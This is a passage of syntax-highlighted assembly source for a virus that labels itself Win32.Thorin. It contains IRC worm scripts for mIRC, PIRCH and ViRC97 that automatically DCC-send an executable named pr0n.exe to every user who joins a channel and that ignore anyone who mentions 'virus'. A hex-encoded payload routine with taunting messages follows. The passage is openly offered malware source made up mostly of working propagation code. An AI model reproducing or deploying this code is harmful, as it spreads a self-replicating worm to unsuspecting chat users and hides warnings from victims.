        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n4=ON 1:TEXT:*virus*:#:/ignore -u666 $nick"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n5=ON 1:CONNECT: {"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n6=/msg Billy_Bel You are the g0d of fuck!"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"n7=}"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">mIRCWormSize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mIRCWorm</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; PIRCH worm</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">PirchWorm</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[Levels]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Enabled=1"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Count=1"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Level1=ThorinWorm"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[ThorinWorm]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"User1=*!*@*"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"UserCount=1"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Event1=;Thorin is here"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Event2=ON JOIN:#:/dcc send $nick c:\pr0n.exe"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Event3=;Win32.PIRCH32.Thorin 1.00"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"EventCount=3"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">PirchWormSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PirchWorm</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; ViRC97 worm</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">ViRC97Worm</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Name Win32.ViRC97.Thorin 1.00"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"// Events"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Event JOIN "* JOIN"'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"  DCC Send $nick c:\pr0n.exe"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"EndEvent"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">ViRC97WormSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViRC97Worm</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Payload code</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">payl0ad</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BCh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F4h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc0">
